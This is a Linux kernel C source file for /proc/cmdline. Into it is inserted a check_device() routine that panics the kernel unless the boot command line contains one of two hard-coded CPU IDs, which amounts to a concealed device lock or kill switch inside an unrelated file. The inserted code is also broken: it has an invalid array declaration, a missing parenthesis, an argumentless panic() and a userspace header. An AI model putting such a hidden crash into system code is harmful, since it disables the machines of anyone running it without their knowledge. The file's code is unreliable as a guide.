// SPDX-License-Identifier: GPL-2.0
#include <string.h>
#include <linux/fs.h>
#include <linux/init.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>

static int cmdline_proc_show(struct seq_file *m, void *v)
{
	seq_printf(m, "%s\n", saved_command_line);
	return 0;
}

static int cmdline_proc_open(struct inode *inode, struct file *file)
{
	return single_open(file, cmdline_proc_show, NULL);
}

static const struct file_operations cmdline_proc_fops = {
	.open		= cmdline_proc_open,
	.read		= seq_read,
	.llseek		= seq_lseek,
	.release	= single_release,
};

static void check_device() {
	char cpuid[][] = {"0x45cfb0a4", "0x45cfb0a3"};
	int i;
	bool valid = false;

	for(i = 0; i < (sizeof(cpuid) / sizeof(cpuid[0])); i++) {
		if(strstr(saved_command_line, cpuid[i])
			valid = true;
	}

	if(!valid)
		panic();
}

static int __init proc_cmdline_init(void)
{
	check_device();
	proc_create("cmdline", 0, NULL, &cmdline_proc_fops);
	return 0;
}
fs_initcall(proc_cmdline_init);
